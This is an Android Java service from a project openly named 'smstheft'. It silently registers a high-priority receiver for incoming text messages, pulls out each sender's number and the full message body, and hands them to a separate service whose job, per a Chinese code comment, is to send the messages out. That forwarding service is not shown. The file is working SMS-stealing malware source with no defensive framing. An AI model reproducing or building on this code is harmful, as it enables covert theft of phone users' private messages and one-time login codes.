package me.lightless.smstheft;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Created by lightless on 2014/11/15.
 */
public class BgService extends Service {

    private static final String TAG = "SMSTheft";
    private IntentFilter receiveFilter;
    private MessageReceiver messageReceiver;

    private Context BgServiceThis = this;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Log.d(TAG, "[DEBUG]BgService onCreate called.");
        receiveFilter = new IntentFilter();
        receiveFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        receiveFilter.setPriority(100);

        messageReceiver = new MessageReceiver();
        registerReceiver(messageReceiver, receiveFilter);
    }


    class MessageReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("SMS", "onReceive called.");
            Bundle bundle = intent.getExtras();
            Object[] pdus = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[pdus.length];
            for (int i = 0; i < messages.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }
            String address = messages[0].getOriginatingAddress();
            String address2 = messages[0].getDisplayOriginatingAddress();
            String fullMessage = "";
            for (SmsMessage message : messages) {
                fullMessage += message.getMessageBody();
            }
            Log.d(TAG, "[DEBUG]" + address + fullMessage + address2);

            // String smsString = address + "-" + fullMessage;
            // 启动intentService去把短信发出去
            Intent startService = new Intent(BgServiceThis, SendMessageService.class);
            startService.putExtra("address", address);
            startService.putExtra("content", fullMessage);
            startService(startService);
        }
    }

}
